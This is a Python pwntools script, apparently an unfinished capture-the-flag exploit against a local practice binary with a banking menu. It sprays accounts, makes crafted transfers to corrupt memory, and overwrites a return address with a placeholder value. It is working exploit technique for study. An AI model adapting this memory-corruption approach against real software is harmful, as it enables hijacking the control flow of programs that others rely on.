#!/usr/bin/env python3
from pwn import *

exe = ELF("./vuln")
libc = ELF("./libc.so.6")

context.binary = exe

p = process("./vuln")
#create     b *_Z9interfacev+1112 
gdb.attach(p, gdbscript="""
    b *_Z9interfacev+877 
    b *_Z9interfacev+623 
    b *_Z9interfacev+348 
    b *_Z9interfacev+441 
    b *_Z9interfacev+1426
    c
""")
# first break: option 1, second: 2 and so on (create, view, transfer, deactivate, support, return)
account_counter = 0

def choose(choice):
    p.recvuntil(b"> ")
    p.sendline(str(choice).encode())

def create_account(name):
    choose(1)
    p.recvuntil(b"Account Name: ")
    p.sendline(name)
    global account_counter
    account_counter += 1

def support_ticket(id, content):
    choose(5)
    p.recvuntil(b"concern?")
    p.sendline(str(id).encode())
    p.recvuntil(b"(1000 charaters):")
    p.sendline(content)

def transfer(from_account, to_account, amount):
    choose(3)
    p.recvuntil(b"from?")
    p.sendline(str(from_account).encode())
    p.recvuntil(b"to?")
    p.sendline(str(to_account).encode())
    p.recvuntil(b"transfer?")
    p.sendline(str(amount).encode())

def disable(id):
    choose(4)
    p.recvuntil(b"disable?")
    p.sendline(str(id).encode())
    # something wrong with vuln here i think
    p.recvuntil(b"concern?")
    p.sendline(b"0")
    p.recvuntil(b"(1000 charaters):")
    p.sendline(b"?")

create_account(b"A"*79)
support_ticket(0, b"")
for _ in range(200):
    create_account(b"B"*79)

transfer(20, 128, 5)
transfer(20, 129, 5)
transfer(20, 130, 5)
transfer(20, 131, 5)
transfer(21, 132, 5)
transfer(21, 133, 5)
transfer(21, 134, 5)
transfer(21, 135, 5)

# support_ticket(0, b"")

# change rip and return
new_rip = 0x1234567891011
create_account(b"K"*68 + p64(new_rip))
support_ticket(account_counter-1, b"Z"*20)
choose(6)

p.interactive()